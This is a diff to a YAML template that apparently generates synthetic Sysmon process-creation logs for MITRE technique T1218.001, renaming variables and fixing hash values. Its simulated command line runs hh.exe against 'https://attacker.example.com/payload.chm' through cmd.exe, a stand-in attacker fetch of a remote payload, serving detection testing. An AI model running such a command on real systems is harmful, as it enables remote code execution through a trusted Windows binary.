@@ -10,35 +10,32 @@ mitre:
   techniques: [T1218.001]
 
 state:
-  domain_short:        CORP
-  domain_tld:          local
-  domain_short_lower:  fn.lower(ref.domain_short)
-  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
-  computer:            gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
-  sysmon_pid:          gen.int(min=1000, max=4000)
-  sysmon_tid:          gen.int(min=1000, max=9999)
-  event_record_id:     gen.int(min=5000, max=99999)
-  proc_guid_raw:       gen.uuid()
-  proc_guid:           "{${ref.proc_guid_raw}}"
-  proc_pid:            gen.int(min=1000, max=9999)
-  parent_guid_raw:     gen.uuid()
-  parent_guid:         "{${ref.parent_guid_raw}}"
-  parent_pid:          gen.int(min=1000, max=9999)
-  logon_guid_raw:      gen.uuid()
-  logon_guid:          "{${ref.logon_guid_raw}}"
-  user:                gen.username()
-  domain_user:         "CORP\\${ref.user}"
-  remote_url:          "https://attacker.example.com/payload.chm"
-  command_line:        "hh.exe ${ref.remote_url}"
-  md5:                 fn.md5(ref.remote_url)
-  sha256:              fn.sha256(ref.remote_url)
-  imphash:             fn.md5(ref.command_line)
-  current_directory:   "C:\\Users\\${ref.user}\\AppData\\Local\\Temp\\"
-  logon_id:            "0x148e3a"
-  terminal_session_id: 2
-  integrity_level:     High
-  parent_image:        "C:\\Windows\\System32\\cmd.exe"
-  parent_command_line: "\"C:\\Windows\\system32\\cmd.exe\" /c \"${ref.command_line}\""
+  domain_short:           CORP
+  domain_tld:             local
+  domain_short_lower:     fn.lower(ref.domain_short)
+  domain_fqdn:            "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:               gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
+  sysmon_pid:             gen.int(min=1000, max=4000)
+  sysmon_tid:             gen.int(min=1000, max=9999)
+  event_record_id:        gen.int(min=5000, max=99999)
+  process_guid_raw:       gen.uuid()
+  process_guid:           "{${ref.process_guid_raw}}"
+  process_id:             gen.int(min=1000, max=9999)
+  parent_process_guid_raw: gen.uuid()
+  parent_process_guid:    "{${ref.parent_process_guid_raw}}"
+  parent_process_id:      gen.int(min=1000, max=9999)
+  logon_guid_raw:         gen.uuid()
+  logon_guid:             "{${ref.logon_guid_raw}}"
+  user:                   gen.username()
+  domain_user:            "${ref.domain_short}\\${ref.user}"
+  remote_url:             "https://attacker.example.com/payload.chm"
+  command_line:           "hh.exe ${ref.remote_url}"
+  current_directory:      "C:\\Users\\${ref.user}\\AppData\\Local\\Temp\\"
+  logon_id:               "0x148e3a"
+  terminal_session_id:    2
+  integrity_level:        High
+  parent_image:           "C:\\Windows\\System32\\cmd.exe"
+  parent_command_line:    "\"C:\\Windows\\system32\\cmd.exe\" /c \"${ref.command_line}\""
 
 steps:
   - emit:
@@ -72,9 +69,9 @@ steps:
             - "@Name": UtcTime
               "#text": gen.timestamp(format=sysmon)
             - "@Name": ProcessGuid
-              "#text": ref.proc_guid
+              "#text": ref.process_guid
             - "@Name": ProcessId
-              "#text": ref.proc_pid
+              "#text": ref.process_id
             - "@Name": Image
               "#text": "C:\\Windows\\hh.exe"
             - "@Name": FileVersion
@@ -102,11 +99,11 @@ steps:
             - "@Name": IntegrityLevel
               "#text": ref.integrity_level
             - "@Name": Hashes
-              "#text": "MD5=${ref.md5},SHA256=${ref.sha256},IMPHASH=${ref.imphash}"
+              "#text": "MD5=52AFE6DE5E463B7A08C184B1EB49DD6A,SHA256=9823D79E936B57C94BFB84383CC708BFC15D1D16E67F6CB119B60F28B01BFA63,IMPHASH=4EDF49AE6BCC4F8FED829FAFD5D4D269"
             - "@Name": ParentProcessGuid
-              "#text": ref.parent_guid
+              "#text": ref.parent_process_guid
             - "@Name": ParentProcessId
-              "#text": ref.parent_pid
+              "#text": ref.parent_process_id
             - "@Name": ParentImage
               "#text": ref.parent_image
             - "@Name": ParentCommandLine
